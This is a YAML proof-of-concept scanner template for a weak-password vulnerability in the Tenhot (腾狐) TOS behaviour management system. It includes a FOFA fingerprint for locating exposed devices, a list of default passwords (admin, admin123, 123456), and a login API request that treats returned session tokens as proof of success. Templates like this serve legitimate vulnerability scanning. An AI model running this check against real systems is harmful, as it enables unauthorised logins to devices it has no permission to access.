id: poc-yaml-tenhot-tos-bms-weak-password
info:
  name: 腾狐TOS行为管理系统 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: 腾狐TOS行为管理系统
  fofa: body="深圳市腾狐物联科技有限公司"
variables:
  passwd: 'admin

    admin123

    123456

    '
firstRequest:
  method: GET
  path: /view/admin_login/login.html
  expression: contains(body,"深圳市腾狐物联科技有限公司")
requests:
- method: GET
  path: /v1/admin/api/login?&_=1747894945589&username=admin&password={{.passwd}}
  expression: status_code == 200 && contains(body,"data") && contains(content_type,"text/json")
    && matches(body,"\"refresh\":\"([0-9a-z]{32})\"") && matches(body,"\"token\":\"([0-9a-z]{32})\"")
transport: http
